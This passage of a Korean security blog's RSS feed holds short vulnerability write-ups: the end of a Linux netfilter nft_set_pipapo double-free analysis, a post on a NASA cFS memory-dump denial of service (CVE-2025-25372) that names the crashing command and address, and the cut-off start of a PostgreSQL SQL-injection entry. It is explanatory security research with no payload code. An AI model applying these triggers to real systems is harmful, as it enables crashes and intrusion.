nft_set_destroy(&amp;trans-&gt;ctx, nft_trans_set(trans));[...]}[...]<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">nft_set_destroy</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct nft_ctx *ctx, struct nft_set *<span class="hljs-built_in">set</span>)</span></span><span class="hljs-function"></span>{[...] <span class="hljs-built_in">set</span>-&gt;ops-&gt;destroy(ctx, <span class="hljs-built_in">set</span>);[...]}</code></pre></li><li><p><strong>Double-Free &#xBC1C;&#xC0DD;:</strong> <code>nft_pipapo_destroy</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB420; &#xB54C;, <code>priv-&gt;clone</code>&#xC740; &#xC874;&#xC7AC;&#xD558;&#xACE0;(<code>dirty</code> &#xD50C;&#xB798;&#xADF8;&#xAC00; &#xC124;&#xC815;&#xB420; &#xC815;&#xB3C4;&#xC758; &#xBCC0;&#xACBD;&#xC774; &#xC788;&#xC5C8;&#xC73C;&#xBBC0;&#xB85C;), <code>priv-&gt;dirty</code> &#xD50C;&#xB798;&#xADF8;&#xB294; &#xC5EC;&#xC804;&#xD788; <code>true</code>&#xC785;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xC758; <code>nft_pipapo_destroy</code> &#xD568;&#xC218; &#xB0B4;&#xC758; <code>if (priv-&gt;clone)</code> &#xBE14;&#xB85D; &#xC548;&#xC5D0;&#xC11C; <code>if (priv-&gt;dirty)</code> &#xC870;&#xAC74;&#xC774; &#xCC38;&#xC774; &#xB418;&#xC5B4;, <code>nft_set_pipapo_match_destroy(ctx, set, priv-&gt;clone)</code>&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xC804;&#xC5D0; (&#xC81C;&#xAC70;&#xB41C; &#xB77C;&#xC778;&#xC5D0;&#xC11C;) <code>nft_set_pipapo_match_destroy(ctx, set, priv-&gt;match)</code>&#xB3C4; &#xD638;&#xCD9C;&#xB418;&#xC5C8;&#xC73C;&#xBBC0;&#xB85C;, &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xC774;&#xBBF8; &#xCEE4;&#xBC0B;&#xB41C; &#xC694;&#xC18C;&#xB4E4;&#xC5D0; &#xB300;&#xD574; <code>nf_tables_set_elem_destroy</code>&#xAC00; &#xB450; &#xBC88; &#xD638;&#xCD9C;&#xB418;&#xC5B4; Double-Free&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p></li></ol><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xB450; &#xAC1C;&#xC758; &#xCEE4;&#xBC0B;&#xC774; &#xC0C1;&#xD638;&#xC791;&#xC6A9;&#xD55C; &#xACB0;&#xACFC;&#xB85C; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCCAB; &#xBC88;&#xC9F8; &#xCEE4;&#xBC0B;(<code>9827a0e6e23b</code>)&#xC740; &#xC5B4;&#xBCF4;&#xD2B8;(abort) &#xACBD;&#xB85C;&#xC5D0;&#xC11C; &#xD074;&#xB860; &#xB0B4;&#xC758; &#xCEE4;&#xBC0B;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC694;&#xC18C;&#xB4E4;&#xC744; &#xD574;&#xC81C;&#xD558;&#xAE30; &#xC704;&#xD574; <code>nft_pipapo_destroy</code> &#xB0B4;&#xC5D0; <code>if (priv-&gt;dirty)</code> &#xC870;&#xAC74;&#xACFC; &#xD568;&#xAED8; <code>nft_set_pipapo_match_destroy(ctx, set, m)</code> &#xD638;&#xCD9C;&#xC744; &#xCD94;&#xAC00;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2F9;&#xC2DC;&#xC5D0;&#xB294; &#xC774; &#xCF54;&#xB4DC;&#xAC00; &#xC8FC;&#xB85C; &#xC5B4;&#xBCF4;&#xD2B8; &#xACBD;&#xB85C;&#xC5D0;&#xC11C;&#xB9CC; &#xB3C4;&#xB2EC; &#xAC00;&#xB2A5;&#xD588;&#xACE0;, &#xC774; &#xACBD;&#xB85C;&#xC5D0;&#xC11C;&#xB294; &#xCEE4;&#xBC0B;&#xB41C; &#xC694;&#xC18C;&#xAC00; &#xC5C6;&#xC5B4; &#xC911;&#xBCF5; &#xD574;&#xC81C; &#xBB38;&#xC81C;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0; &#xC54A;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC57D; 1&#xB144; &#xD6C4; &#xB450; &#xBC88;&#xC9F8; &#xCEE4;&#xBC0B;(<code>212ed75dc5fb</code>)&#xC774; <code>set-&gt;dead</code> &#xD50C;&#xB798;&#xADF8;&#xC640; &#xAD00;&#xB828; &#xB85C;&#xC9C1;&#xC744; &#xB3C4;&#xC785;&#xD558;&#xBA74;&#xC11C;, &#xCEE4;&#xBC0B; &#xACBD;&#xB85C;&#xC5D0;&#xC11C;&#xB3C4; <code>priv-&gt;dirty</code> &#xD50C;&#xB798;&#xADF8;&#xAC00; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xCC44; <code>nft_pipapo_destroy</code>&#xC5D0; &#xB3C4;&#xB2EC;&#xD560; &#xC218; &#xC788;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xACBD;&#xB85C;&#xAC00; &#xC0DD;&#xACBC;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xC0C8;&#xB85C;&#xC6B4; &#xACBD;&#xB85C;&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xBBF8; &#xCEE4;&#xBC0B;&#xB41C; &#xC694;&#xC18C;&#xB4E4;&#xC774; <code>priv-&gt;match</code>&#xC640; <code>priv-&gt;clone</code> &#xC591;&#xCABD;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xBBC0;&#xB85C;, &#xCCAB; &#xBC88;&#xC9F8; &#xCEE4;&#xBC0B;&#xC5D0;&#xC11C; &#xCD94;&#xAC00;&#xB41C; &#xCF54;&#xB4DC;&#xAC00; &#xC758;&#xB3C4;&#xCE58; &#xC54A;&#xAC8C; Double-Free&#xB97C; &#xC720;&#xBC1C;&#xD558;&#xAC8C; &#xB41C; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/LPE/">LPE</category>
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/Linux/">Linux</category>
      
      <category domain="https://hackyboiz.github.io/tags/Kernel/">Kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/Netfilter/">Netfilter</category>
      
      <category domain="https://hackyboiz.github.io/tags/UAF/">UAF</category>
      
      <category domain="https://hackyboiz.github.io/tags/Use-After-Free/">Use-After-Free</category>
      
      <category domain="https://hackyboiz.github.io/tags/nft-set-pipapo/">nft_set_pipapo</category>
      
      
      <comments>https://hackyboiz.github.io/2025/05/03/j0ker/2025-05-03/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-25372: cFS 메모리 관리 모듈의 부적절한 메모리 접근 검증으로 인한 서비스 거부 취약점</title>
      <link>https://hackyboiz.github.io/2025/05/01/OUYA77/2025-05-01/</link>
      <guid>https://hackyboiz.github.io/2025/05/01/OUYA77/2025-05-01/</guid>
      <pubDate>Thu, 01 May 2025 13:05:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://visionspace.com/nasa-cfs-version-aquila-software-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://visionspace.com/nasa-cfs-version-aquila-software-vulnerability-assessment/">https://visionspace.com/nasa-cfs-version-aquila-software-vulnerability-assessment/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>cFS version Aquila(Releases)</li></ul><p><img src="image.png" alt="image.png"></p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>NASA&#xC758; cFS(Core Flight System)&#xB294; &#xC704;&#xC131;, &#xC6B0;&#xC8FC; &#xD0D0;&#xC0AC;&#xC120;, &#xAE30;&#xD0C0; &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xD65C;&#xC6A9;&#xB418;&#xB294; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC785;&#xB2C8;&#xB2E4;.  &#xCD5C;&#xADFC; cFS&#xC758; Memory Management(MM) &#xBAA8;&#xB4C8;&#xC5D0;&#xC11C; &#xC11C;&#xBE44;&#xC2A4; &#xAC70;&#xBD80;(DoS, Denial of Service) &#xACF5;&#xACA9;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; MM &#xBAA8;&#xB4C8;&#xC774; &#xBA54;&#xBAA8;&#xB9AC; &#xC77D;&#xAE30; &#xB610;&#xB294; &#xC4F0;&#xAE30; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD560; &#xB54C;, &#xC811;&#xADFC;&#xD558;&#xB824;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xAC00; &#xC720;&#xD6A8;&#xD55C;&#xC9C0;&#xB97C; &#xC801;&#xC808;&#xD788; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xD55C; &#xC8FC;&#xC694; &#xD568;&#xC218;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;:</p><ul><li><strong><code>MM_Load</code></strong>: &#xBA54;&#xBAA8;&#xB9AC; &#xC77D;&#xAE30; &#xAD00;&#xB828; &#xD568;&#xC218;</li><li><strong><code>MM_Dump</code></strong>: &#xBA54;&#xBAA8;&#xB9AC; &#xC4F0;&#xAE30; &#xAD00;&#xB828; &#xD568;&#xC218;</li></ul><p>&#xC774; &#xB450; &#xD568;&#xC218; &#xBAA8;&#xB450; &#xC678;&#xBD80; &#xC785;&#xB825;&#xC774;&#xB098; &#xBA85;&#xB839;&#xC5D0; &#xB530;&#xB77C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC9C1;&#xC811; &#xC811;&#xADFC;&#xD558;&#xAC8C; &#xB418;&#xBA70;, &#xAC80;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC8FC;&#xC18C; &#xC811;&#xADFC; &#xC2DC; <strong>Segmentation fault</strong>&#xB97C; &#xC720;&#xBC1C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h3><p>&#xC77C;&#xBC18;&#xC801;&#xC778; &#xC0C1;&#xD669;&#xC5D0;&#xC11C; <strong><code>MM_DUMP_MEM_TO_FILE_CC</code></strong> &#xBA85;&#xB839;&#xC740; &#xBA54;&#xBAA8;&#xB9AC; &#xC704;&#xCE58;&#xC5D0;&#xC11C; &#xC9C0;&#xC815;&#xB41C; &#xC218;&#xC758; &#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xD30C;&#xC77C;&#xC5D0; &#xB364;&#xD504;&#xD558;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image%201.png" alt="image.png"></p><p>&#xC774; &#xD568;&#xC218;&#xB294; &#xC18C;&#xC2A4; &#xC8FC;&#xC18C;, &#xC8FC;&#xC18C; &#xBC94;&#xC704;, &#xC694;&#xCCAD;&#xB41C; &#xB370;&#xC774;&#xD130; &#xD06C;&#xAE30;, &#xADF8;&#xB9AC;&#xACE0; &#xC800;&#xC7A5;&#xB420; &#xD30C;&#xC77C; &#xACBD;&#xB85C;&#xB97C; &#xAC80;&#xC99D;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC774;&#xB7EC;&#xD55C; &#xBAA8;&#xB4E0; &#xAC80;&#xC99D;&#xC774; &#xC62C;&#xBC14;&#xB974;&#xAC8C; &#xC218;&#xD589;&#xB418;&#xC9C0; &#xC54A;&#xC544; <strong>cFS</strong> &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xAC00; &#xC911;&#xB2E8;&#xB418;&#xC5B4; &#xC11C;&#xBE44;&#xC2A4; &#xAC70;&#xBD80;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBA85;&#xB839; &#xAD6C;&#xC870;&#xB294; <strong>mm/fsw/inc/mm_msg.h</strong> &#xC5D0; &#xC815;&#xC758;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4; :</p><p><img src="image%202.png" alt="image.png"></p><p>&#xC774; &#xAD6C;&#xC870;&#xB294; <strong>MM_DumpMemToFileCmd</strong> (mm/fsw/src/mm_dump.c)&#xC5D0;&#xC11C; &#xC785;&#xB825;&#xC744; &#xAC80;&#xC99D;&#xD558;&#xAE30; &#xC804;&#xC5D0; &#xAC01; &#xD544;&#xB4DC;&#xB97C; &#xCD94;&#xCD9C;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xCCAB; &#xBC88;&#xC9F8; &#xAC80;&#xC99D;&#xC740; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xB364;&#xD504;&#xD560; &#xC2EC;&#xBCFC;&#xB9AD; &#xC8FC;&#xC18C;&#xC5D0;&#xC11C; &#xC77C;&#xC5B4;&#xB0A9;&#xB2C8;&#xB2E4;.</p><p><img src="image%203.png" alt="image.png"></p><p><strong>MM_ResolveSymAddr</strong> &#xD568;&#xC218; &#xB0B4;&#xBD80;&#xB97C; &#xBCF4;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image%204.png" alt="image.png"></p><p>&#xC624;&#xD504;&#xC14B;&#xC774; &#xD3EC;&#xD568;&#xB41C; &#xACBD;&#xC6B0; &#xC774; &#xD568;&#xC218;&#xB294; &#xD56D;&#xC0C1; <strong>Valid = True</strong>&#xB97C; <strong>**&#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. 525~526&#xD589;&#xC5D0;&#xC11C; &#xC2EC;&#xBCFC; &#xC774;&#xB984;&#xC774; &#xB110; &#xBB38;&#xC790;&#xC5F4;&#xC774;&#xBA74; &#xC785;&#xB825;&#xB41C; &#xC624;&#xD504;&#xC14B;&#xC744; &#xC808;&#xB300; &#xC8FC;&#xC18C;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; True&#xB97C; </strong>&#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; &#xC785;&#xB825;&#xC73C;&#xB85C; &#xC804;&#xC1A1;&#xB41C; &#xC2EC;&#xBCFC;&#xC758; &#xC8FC;&#xC18C;&#xC640; &#xC624;&#xD504;&#xC14B;&#xC744; &#xB354;&#xD55C; &#xAC12;&#xC744; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7F0; &#xB2E4;&#xC74C; <strong>MM_VerifyLoadDumpParams</strong>&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB97C; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image%205.png" alt="image.png"></p><p>&#xC774; &#xD568;&#xC218;&#xB294; &#xBA3C;&#xC800; &#xC120;&#xD0DD;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC; &#xC720;&#xD615;&#xC774; &#xC720;&#xD6A8;&#xD55C;&#xC9C0;, &#xC694;&#xCCAD;&#xB41C; &#xBC14;&#xC774;&#xD2B8; &#xC218;&#xAC00; &#xD574;&#xB2F9; &#xBA54;&#xBAA8;&#xB9AC; &#xC720;&#xD615;&#xC758; &#xCD5C;&#xB300; &#xD06C;&#xAE30;&#xBCF4;&#xB2E4; &#xC791;&#xC740;&#xC9C0; &#xD655;&#xC778;&#xD55C; &#xD6C4; <strong>CFE_PSP_MemValidateRange</strong>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xC8FC;&#xC18C;&#xAC00; PSP &#xBA54;&#xBAA8;&#xB9AC; &#xD14C;&#xC774;&#xBE14;&#xC5D0; &#xC815;&#xC758;&#xB41C; &#xC720;&#xD6A8;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xBC94;&#xC704;&#xC5D0; &#xC18D;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p><p>PSP &#xD14C;&#xC774;&#xBE14;&#xC740; &#xBD80;&#xD305; &#xC2DC; <strong>CFE_PSP_SetupReservedMemoryMap</strong>&#xC5D0; &#xC758;&#xD574; &#xC815;&#xC758;&#xB429;&#xB2C8;&#xB2E4;<strong>.</strong> Linux &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xACBD;&#xC6B0;, &#xAE30;&#xBCF8; &#xC124;&#xC815;&#xC740; &#xC804;&#xCCB4; &#xBA54;&#xBAA8;&#xB9AC; &#xACF5;&#xAC04;&#xC744; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30; &#xC791;&#xC5C5;&#xC5D0; &#xC720;&#xD6A8;&#xD55C; &#xAC83;&#xC73C;&#xB85C; &#xC815;&#xC758;&#xD569;&#xB2C8;&#xB2E4;. &#xC544;&#xB798; &#xC0AC;&#xC9C4;&#xC740; PSP&#xC758; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xBA54;&#xBAA8;&#xB9AC; &#xD14C;&#xC774;&#xBE14; &#xC124;&#xC815;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="image%206.png" alt="image.png"></p><ul><li><strong><code>MMFileHeader.SymAddress.Offset = SrcAddress;</code></strong>:<ul><li>&#xB364;&#xD504;&#xD560; &#xBA54;&#xBAA8;&#xB9AC;&#xC758; &#xC2DC;&#xC791; &#xC8FC;&#xC18C;(<code>SrcAddress</code>)&#xAC00; &#xD30C;&#xC77C; &#xD5E4;&#xB354;&#xC758; <code>SymAddress</code> &#xAD6C;&#xC870;&#xCCB4; &#xB0B4; <code>Offset</code> &#xD544;&#xB4DC;&#xC5D0; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;.</li></ul></li><li><strong><code>MMFileHeader.MemType = CmdPtr-&gt;Payload.MemType;</code></strong>:<ul><li>&#xB364;&#xD504;&#xD560; &#xBA54;&#xBAA8;&#xB9AC;&#xC758; &#xD0C0;&#xC785;<strong>(</strong><code>MemType</code><strong>)</strong> (&#xC608;: RAM, EEPROM)&#xC774; &#xBA85;&#xB839; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB85C;&#xBD80;&#xD130; &#xCD94;&#xCD9C;&#xB418;&#xC5B4; &#xD30C;&#xC77C; &#xD5E4;&#xB354;&#xC5D0; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;.</li></ul></li><li><strong><code>MMFileHeader.NumOfBytes = CmdPtr-&gt;Payload.NumOfBytes;</code></strong>:<ul><li>&#xB364;&#xD504;&#xD560; &#xB370;&#xC774;&#xD130;&#xC758; &#xD06C;&#xAE30;(<code>NumOfBytes</code>)&#xAC00; &#xBA85;&#xB839; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB85C;&#xBD80;&#xD130; &#xCD94;&#xCD9C;&#xB418;&#xC5B4; &#xD30C;&#xC77C; &#xD5E4;&#xB354;&#xC5D0; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;.</li></ul></li></ul><p>&#xC774;&#xB294; &#xB2E4;&#xB978; &#xC6B4;&#xC601; &#xCCB4;&#xC81C;&#xC5D0;&#xB3C4; &#xD574;&#xB2F9;&#xB418;&#xB294;&#xB370;, &#xC5EC;&#xAE30;&#xC11C;&#xB294; mcp750-vxworks&#xB9CC;&#xC774; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xC81C;&#xD55C;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC; &#xACF5;&#xAC04;&#xC744; &#xC815;&#xC758;&#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p>Linux&#xC640; &#xB300;&#xC870;&#xC801;&#xC73C;&#xB85C;, &#xC5B8;&#xAE09;&#xB41C; mcp750-vxworks&#xC640; &#xAC19;&#xC740; &#xD2B9;&#xC815; &#xC6B4;&#xC601;&#xCCB4;&#xC81C; &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xB294; PSP &#xBA54;&#xBAA8;&#xB9AC; &#xD14C;&#xC774;&#xBE14;&#xC774; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; <strong>&#xB354;&#xC6B1; &#xC81C;&#xD55C;&#xC801;&#xC778; &#xBA54;&#xBAA8;&#xB9AC; &#xACF5;&#xAC04;&#xB9CC;&#xC744; &#xC720;&#xD6A8;&#xD55C; &#xC601;&#xC5ED;&#xC73C;&#xB85C; &#xC815;&#xC758;</strong>&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xC7A0;&#xC7AC;&#xC801;&#xC73C;&#xB85C; &#xC798;&#xBABB;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC; &#xC811;&#xADFC;&#xC774; &#xAC00;&#xB2A5;&#xD568;&#xC744; &#xC758;&#xBBF8;&#xD569;&#xB2C8;&#xB2E4;.</p></blockquote><p><strong>MM_DumpMemToFileCmd</strong>&#xC5D0;&#xC11C; &#xC785;&#xB825;&#xB41C; &#xBAA8;&#xB4E0; RAM &#xC8FC;&#xC18C;&#xB294; &#xAC80;&#xC99D;&#xC744; &#xD1B5;&#xACFC;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xC774; &#xACC4;&#xC18D;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xB364;&#xD504;&#xB97C; &#xC548;&#xB0B4;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB420; &#xD30C;&#xC77C; &#xD5E4;&#xB354;&#xB97C; &#xC815;&#xC758;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xBA85;&#xB839;&#xC5D0;&#xC11C; &#xC120;&#xD0DD;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC720;&#xD615;&#xC774; <strong>MM_RAM</strong> &#xB610;&#xB294; <strong>MM_EEPROM</strong>&#xC774;&#xBA74; , &#xC774;&#xC804;&#xC5D0; &#xC815;&#xC758;&#xB41C; &#xD30C;&#xC77C; &#xD5E4;&#xB354;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; <strong>MM_DumpMemToFile&#xC744;</strong> &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image%207.png" alt="image.png"></p><p> &#xC774;&#xB54C; &#xD30C;&#xC77C; &#xD5E4;&#xB354;&#xC5D0; &#xC815;&#xC758;&#xB41C; &#xC624;&#xD504;&#xC14B;&#xC744; <code>memcpy</code>&#xC758; &#xC18C;&#xC2A4; &#xD3EC;&#xC778;&#xD130;&#xB85C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30;&#xC5D0; <code>memcpy</code> &#xC791;&#xC5C5;&#xC5D0;&#xC11C; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBC94;&#xC704; &#xC678;&#xBD80;&#xC5D0;&#xC11C; &#xBCF4;&#xD638;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xBCF5;&#xC0AC;&#xD558;&#xB824;&#xACE0; &#xC2DC;&#xB3C4;&#xD558;&#xC5EC; &#xC138;&#xADF8;&#xBA3C;&#xD14C;&#xC774;&#xC158; &#xC624;&#xB958;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>cmdUtil&#xACFC; &#xAC19;&#xC740; &#xB3C4;&#xAD6C;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; MM_DUMP_MEM_TO_FILE_CC &#xBA85;&#xB839;&#xC744; &#xD638;&#xCD9C;&#xD558;&#xBA74; <strong>Segmentation fault</strong>&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="https://visionspace.com/wp-content/uploads/2025/03/image-57-1024x627.png" alt></p><p>&#xD654;&#xBA74; &#xC0C1;&#xB2E8;&#xC5D0;&#xC11C; &#xC2E4;&#xD589; &#xC911;&#xC774;&#xB358; <strong>cSF</strong> &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xAC00; &#xC720;&#xD6A8;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xC8FC;&#xC18C;&#xC778; 0x40 &#xC8FC;&#xC18C;&#xC5D0;&#xC11C; &#xBA54;&#xBAA8;&#xB9AC; &#xB364;&#xD504; &#xC694;&#xCCAD;&#xC744; &#xBC1B;&#xC790; &#xC885;&#xB8CC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25372">https://nvd.nist.gov/vuln/detail/CVE-2025-25372</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/NASA-cFS/">NASA cFS</category>
      
      <category domain="https://hackyboiz.github.io/tags/Memory-Management/">Memory Management</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-25372/">CVE-2025-25372</category>
      
      <category domain="https://hackyboiz.github.io/tags/DoS/">DoS</category>
      
      
      <comments>https://hackyboiz.github.io/2025/05/01/OUYA77/2025-05-01/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-1094: PostgreSQL 14.15의 SQL 인젝션 취약점으로 인한 RCE</title>
      <link>https://hackyboiz.github.io/2025/04/30/clalxk/CVE-2025-1094/</link>
      <guid>https://hackyboiz.github.io/2025/04/30/clalxk/CVE-2025-1094/</guid>
      <pubDate>Wed, 30 Apr 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://thehackernews.com/2025/02/postgresql-vulnerabilit</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://thehackernews.com/2025/02/postgresql-vulnerability-exploited.html">https://thehackernews.com/2025/02/postgresql-vulnerability-exploited.html</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>PostgreSQL 14.15</li><li>BeyondTrust Privileged Remote Access (PRA) &#xBC0F; Remote Support (RS) &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;</li><li>&#xC601;&#xD5A5;&#xBC1B;&#xB294; &#xBC84;&#xC804;: PostgreSQL 14.15 &#xBC0F; &#xD574;&#xB2F9; &#xBC84;&#xC804;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; BeyondTrust &#xC81C;&#xD488;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-1094&#xB294; PostgreSQL 14.15 &#xBC84;&#xC804;&#xC758; psql &#xC778;&#xD130;&#xB799;&#xD2F0;&#xBE0C; &#xB3C4;&#xAD6C;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; SQL &#xC778;&#xC81D;&#xC158; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; 